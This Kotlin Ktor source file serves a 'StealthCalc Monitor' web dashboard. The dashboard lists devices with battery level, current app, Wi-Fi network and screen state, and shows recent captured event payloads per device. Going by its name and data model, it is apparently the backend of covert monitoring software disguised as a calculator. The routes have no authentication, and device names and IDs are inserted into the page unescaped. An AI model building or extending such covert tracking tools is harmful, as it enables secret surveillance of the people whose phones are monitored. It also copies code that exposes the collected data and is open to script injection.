package com.stealthcalc.server.routes

import com.stealthcalc.server.db.Devices
import com.stealthcalc.server.db.Events
import com.stealthcalc.server.db.RecentState
import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.response.*
import io.ktor.server.routing.*
import org.jetbrains.exposed.sql.SortOrder
import org.jetbrains.exposed.sql.selectAll
import org.jetbrains.exposed.sql.transactions.transaction

fun Route.webDashboardRoutes() {
    get("/web") {
        val html = buildWebDashboard()
        call.respondText(html, ContentType.Text.Html)
    }

    get("/web/events/{deviceId}") {
        val deviceId = call.parameters["deviceId"] ?: return@get
        val html = buildEventsPage(deviceId)
        call.respondText(html, ContentType.Text.Html)
    }
}

private fun buildWebDashboard(): String {
    val devices = transaction {
        Devices.selectAll().map { row ->
            val id = row[Devices.id]
            val stateMap = RecentState.selectAll()
                .where { RecentState.deviceId eq id }
                .associate { it[RecentState.field] to it[RecentState.value] }
            mapOf(
                "id" to id,
                "name" to row[Devices.name],
                "lastSeen" to row[Devices.lastSeen].toString(),
                "battery" to (stateMap["batteryLevel"] ?: "?"),
                "app" to (stateMap["currentApp"] ?: "?"),
                "wifi" to (stateMap["wifiSsid"] ?: "?"),
                "screen" to (stateMap["isScreenOn"] ?: "?"),
            )
        }
    }

    val eventCount = transaction {
        Events.selectAll().count()
    }

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>StealthCalc Monitor</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
            h1 { color: #bb86fc; margin-bottom: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin-bottom: 16px; }
            .device-name { font-size: 1.3em; color: #bb86fc; margin-bottom: 8px; }
            .stat { display: inline-block; margin-right: 24px; margin-bottom: 8px; }
            .stat-label { color: #888; font-size: 0.85em; }
            .stat-value { font-size: 1.1em; }
            .online { color: #4caf50; }
            .offline { color: #666; }
            a { color: #bb86fc; text-decoration: none; }
            a:hover { text-decoration: underline; }
            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
            .count { color: #888; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>StealthCalc Monitor</h1>
            <span class="count">$eventCount total events</span>
        </div>
        ${devices.joinToString("") { d ->
            val lastSeen = d["lastSeen"]?.toLongOrNull() ?: 0
            val isOnline = (System.currentTimeMillis() - lastSeen) < 5 * 60 * 1000
            """
            <div class="card">
                <div class="device-name">
                    <span class="${if (isOnline) "online" else "offline"}">●</span>
                    ${d["name"]} <span style="color:#666;font-size:0.7em">${d["id"]}</span>
                </div>
                <div class="stat"><span class="stat-label">Battery</span><br><span class="stat-value">${d["battery"]}%</span></div>
                <div class="stat"><span class="stat-label">App</span><br><span class="stat-value">${d["app"]}</span></div>
                <div class="stat"><span class="stat-label">WiFi</span><br><span class="stat-value">${d["wifi"]}</span></div>
                <div class="stat"><span class="stat-label">Screen</span><br><span class="stat-value">${d["screen"]}</span></div>
                <br><a href="/web/events/${d["id"]}">View Events →</a>
            </div>
            """
        }}
        <script>setTimeout(() => location.reload(), 30000);</script>
    </body>
    </html>
    """.trimIndent()
}

private fun buildEventsPage(deviceId: String): String {
    val events = transaction {
        Events.selectAll()
            .where { Events.deviceId eq deviceId }
            .orderBy(Events.capturedAt, SortOrder.DESC)
            .limit(200)
            .map { row ->
                mapOf(
                    "id" to row[Events.id],
                    "kind" to row[Events.kind],
                    "payload" to row[Events.payload].take(200),
                    "capturedAt" to row[Events.capturedAt].toString(),
                )
            }
    }

    val deviceName = transaction {
        Devices.selectAll().where { Devices.id eq deviceId }.firstOrNull()?.get(Devices.name) ?: deviceId
    }

    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Events — $deviceName</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
            h1 { color: #bb86fc; margin-bottom: 4px; }
            a { color: #bb86fc; text-decoration: none; }
            .back { margin-bottom: 20px; display: inline-block; }
            table { width: 100%; border-collapse: collapse; }
            th { text-align: left; color: #888; padding: 8px; border-bottom: 1px solid #333; }
            td { padding: 8px; border-bottom: 1px solid #222; font-size: 0.9em; vertical-align: top; }
            .kind { color: #bb86fc; font-weight: bold; white-space: nowrap; }
            .payload { color: #aaa; font-family: monospace; font-size: 0.8em; word-break: break-all; }
            .time { color: #666; white-space: nowrap; }
        </style>
    </head>
    <body>
        <a href="/web" class="back">← Back to Dashboard</a>
        <h1>$deviceName</h1>
        <p style="color:#888;margin-bottom:16px">${events.size} most recent events</p>
        <table>
            <tr><th>Time</th><th>Type</th><th>Data</th></tr>
            ${events.joinToString("") { e ->
                val time = java.text.SimpleDateFormat("MMM d HH:mm:ss").format(java.util.Date(e["capturedAt"]!!.toLong()))
                """<tr>
                    <td class="time">$time</td>
                    <td class="kind">${e["kind"]}</td>
                    <td class="payload">${e["payload"]?.replace("<", "&lt;")?.replace(">", "&gt;")}</td>
                </tr>"""
            }}
        </table>
        <script>setTimeout(() => location.reload(), 30000);</script>
    </body>
    </html>
    """.trimIndent()
}
